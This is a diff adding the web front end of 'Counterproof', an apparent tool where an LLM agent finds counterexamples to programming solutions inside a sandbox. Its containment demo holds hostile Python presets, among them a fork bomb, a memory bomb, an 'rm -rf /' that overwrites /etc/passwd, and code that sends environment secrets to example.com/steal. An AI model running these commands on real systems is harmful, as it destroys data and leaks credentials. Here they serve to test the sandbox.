@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Counterproof — proven counterexamples, zero blast radius</title>
+<style>
+:root{--bg:#0d1117;--panel:#161b22;--line:#30363d;--fg:#e6edf3;--mute:#8b949e;--ok:#3fb950;--bad:#f85149;--warn:#d29922;--acc:#58a6ff}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 system-ui,-apple-system,Segoe UI,sans-serif}
+header{padding:18px 24px;border-bottom:1px solid var(--line);display:flex;align-items:baseline;gap:14px}
+h1{margin:0;font-size:22px}h1 span{color:var(--acc)}header p{margin:0;color:var(--mute)}
+main{display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:16px 24px}
+@media(max-width:900px){main{grid-template-columns:1fr}}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px}
+label{display:block;color:var(--mute);font-size:12px;margin:8px 0 4px}
+textarea,select{width:100%;background:#0b0f14;color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:8px;font:12.5px/1.45 ui-monospace,Menlo,monospace}
+textarea{resize:vertical}button{background:var(--acc);color:#04111f;border:0;border-radius:6px;padding:9px 14px;font-weight:600;cursor:pointer;margin-top:10px}
+button.alt{background:#21262d;color:var(--fg);border:1px solid var(--line)}button:disabled{opacity:.5}
+.tabs{display:flex;gap:8px;margin-bottom:6px}.tabs button{margin:0}
+#log div{padding:4px 0;border-bottom:1px dashed #21262d;font-size:13px}
+.k{color:var(--mute);font-family:ui-monospace,monospace;font-size:12px}
+.verdict{font-size:18px;font-weight:700;margin:6px 0}.ok{color:var(--ok)}.bad{color:var(--bad)}.warn{color:var(--warn)}
+pre{background:#0b0f14;border:1px solid var(--line);border-radius:6px;padding:8px;overflow:auto;max-height:240px;font-size:12px;margin:4px 0}
+.blast{border:1px solid var(--warn);border-radius:6px;padding:8px;margin:6px 0;background:#1f1a0f}
+.chip{display:inline-block;border:1px solid var(--line);border-radius:12px;padding:1px 8px;margin:2px;font-size:11.5px;color:var(--mute)}
+.chip.hit{border-color:var(--warn);color:var(--warn)}
+details summary{cursor:pointer;color:var(--mute)}
+</style></head><body>
+<header><h1>Counter<span>proof</span></h1><p>Paste a problem and your solution. An agent hunts for the smallest failing input, proves it by re-execution, and every byte of untrusted code runs in a disposable, network-less sandbox.</p></header>
+<main>
+<section class="card">
+  <div class="tabs"><button id="tHunt">Find counterexample</button><button id="tDet" class="alt">Detonate (containment demo)</button></div>
+  <div id="huntForm">
+    <label>Problem statement</label><textarea id="problem" rows="9"></textarea>
+    <label>Your solution</label>
+    <select id="lang"><option value="python">Python 3</option><option value="cpp">C++17</option></select>
+    <textarea id="code" rows="12" style="margin-top:6px"></textarea>
+    <button id="go">Hunt for a counterexample</button> <button class="alt" id="sample">Load sample (buggy max-subarray)</button>
+  </div>
+  <div id="detForm" style="display:none">
+    <label>Hostile code (runs once, inside the sandbox)</label>
+    <select id="preset">
+      <option value="loop">Infinite loop</option><option value="fork">Fork bomb</option><option value="net">Exfiltrate env to the internet</option>
+      <option value="rm">rm -rf / and write to /etc</option><option value="mem">Memory bomb</option></select>
+    <textarea id="hostile" rows="14" style="margin-top:6px"></textarea>
+    <button id="det">Detonate</button>
+  </div>
+</section>
+<section class="card"><div id="result"></div><h3 style="margin:8px 0 4px;font-size:14px">Agent log</h3><div id="log"></div></section>
+</main>
+<script>
+const $=id=>document.getElementById(id);
+const SAMPLE_P=`Given N integers a_1..a_N, print the maximum sum of a non-empty contiguous subarray.
+Input: first line N (1<=N<=2*10^5), second line N integers (|a_i|<=10^9).
+Output: one integer.`;
+const SAMPLE_C=`n=int(input())
+a=list(map(int,input().split()))
+best=0
+cur=0
+for x in a:
+    cur=max(0,cur+x)
+    best=max(best,cur)
+print(best)`;
+const PRESETS={
+loop:`while True:\n    pass`,
+fork:`import os\nwhile True:\n    os.fork()`,
+net:`import os, socket, urllib.request\nprint("env keys visible:", [k for k in os.environ if 'KEY' in k or 'TOKEN' in k])\nurllib.request.urlopen("http://example.com/steal?d="+repr(dict(os.environ)), timeout=3)`,
+rm:`import subprocess\nprint(subprocess.run("rm -rf / --no-preserve-root; echo pwned > /etc/passwd", shell=True, capture_output=True, text=True).stderr[-400:])\nopen('/etc/hosts','w').write('hacked')`,
+mem:`x=[]\nwhile True:\n    x.append(bytearray(50_000_000))`};
+$('preset').onchange=()=>$('hostile').value=PRESETS[$('preset').value];$('hostile').value=PRESETS.loop;
+$('sample').onclick=()=>{$('problem').value=SAMPLE_P;$('code').value=SAMPLE_C;$('lang').value='python'};
+$('tHunt').onclick=()=>{$('huntForm').style.display='';$('detForm').style.display='none';$('tHunt').className='';$('tDet').className='alt'};
+$('tDet').onclick=()=>{$('huntForm').style.display='none';$('detForm').style.display='';$('tDet').className='';$('tHunt').className='alt'};
+const esc=s=>String(s??'').replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+function log(html){const d=document.createElement('div');d.innerHTML=html;$('log').appendChild(d)}
+function sandboxCard(e){
+  const lim=e.limits||{};const hits=(e.blast||[]);
+  let h=`<div class="blast"><b>Blast Log</b> · <span class="k">${esc(e.phase)} · ${esc(e.container)} · runtime ${esc(e.runtime)} · ${e.ms} ms · exit ${esc(e.exit_code)}</span><br>`;
+  h+=['network: '+lim.network,'memory: '+lim.memory,'pids: '+lim.pids,'cpus: '+lim.cpus,'fs: '+lim.fs,'timeout: '+lim.timeout_s+'s'].map(x=>`<span class="chip">${esc(x)}</span>`).join('');
+  h+=hits.length?'<br>'+hits.map(b=>`<span class="chip hit">⛔ ${esc(b.kind)}</span> <span class="k">${esc(b.detail)}</span>`).join('<br>'):'<br><span class="k">no containment events</span>';
+  if(e.stderr!==undefined) h+=`<pre>${esc((e.stdout||'')+'\n'+(e.stderr||''))}</pre>`;
+  h+=`<br><span class="k">container destroyed: ${e.destroyed?'yes':'no'}</span></div>`;return h}
+async function stream(url,body){
+  $('log').innerHTML='';$('result').innerHTML='<div class="verdict warn">Running…</div>';
+  document.querySelectorAll('button').forEach(b=>b.disabled=true);
+  try{
+  const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+  if(!r.ok){$('result').innerHTML=`<div class="verdict bad">${esc(await r.text())}</div>`;return}
+  const rd=r.body.getReader();const dec=new TextDecoder();let buf='';
+  while(true){const {value,done}=await rd.read();if(done)break;buf+=dec.decode(value,{stream:true});
+    let i;while((i=buf.indexOf('\n\n'))>=0){const line=buf.slice(0,i);buf=buf.slice(i+2);if(line.startsWith('data: '))handle(JSON.parse(line.slice(6)))}}
+  }finally{document.querySelectorAll('button').forEach(b=>b.disabled=false)}}
+function handle(e){
+  if(e.type==='step')log(`▶ <b>${esc(e.step)}</b> ${esc(e.msg)}`);
+  else if(e.type==='artifact')log(`🧠 LLM <span class="k">${esc(e.model)}</span> wrote an oracle and a generator. ${esc(e.notes)}<details><summary>brute.py</summary><pre>${esc(e.brute)}</pre></details><details><summary>gen.py</summary><pre>${esc(e.gen)}</pre></details>`);
+  else if(e.type==='sandbox')log(sandboxCard(e));
+  else if(e.type==='error'){log(`<span class="bad">✖ ${esc(e.msg)}</span>`);$('result').innerHTML=`<div class="verdict bad">Error</div><div>${esc(e.msg)}</div>`}
+  else if(e.type==='final')final(e)}
+function final(e){
+  let h='';
+  if(e.verdict==='counterexample'){h=`<div class="verdict bad">Wrong Answer — proven counterexample</div>
+   <div class="k">found after ${e.tested} random cases at size ${e.size}; replayed in ${esc(e.proof_container)} and reproduced</div>
+   <label>Input</label><pre>${esc(e.input)}</pre><label>Expected (oracle)</label><pre>${esc(e.expected)}</pre><label>Your output</label><pre>${esc(e.got)}</pre>
+   <label>Why</label><div>${esc(e.explanation)}</div>`}
+  else if(e.verdict==='no_counterexample')h=`<div class="verdict ok">No counterexample in ${e.tested} cases</div><div class="k">Not a proof of correctness, but small cases all agree with the oracle.</div>`;
+  else if(e.verdict==='contained')h=`<div class="verdict ok">Contained. Host untouched.</div><div class="k">The code ran with no network, a read-only filesystem, capped memory and processes, and the container was destroyed.</div>`;
+  else h=`<div class="verdict warn">${esc(e.verdict)}</div><pre>${esc(e.detail||e.input||'')}</pre>`;
+  $('result').innerHTML=h}
+$('go').onclick=()=>stream('/api/hunt',{problem:$('problem').value,code:$('code').value,lang:$('lang').value});
+$('det').onclick=()=>stream('/api/detonate',{code:$('hostile').value,lang:'python'});
+</script></body></html>
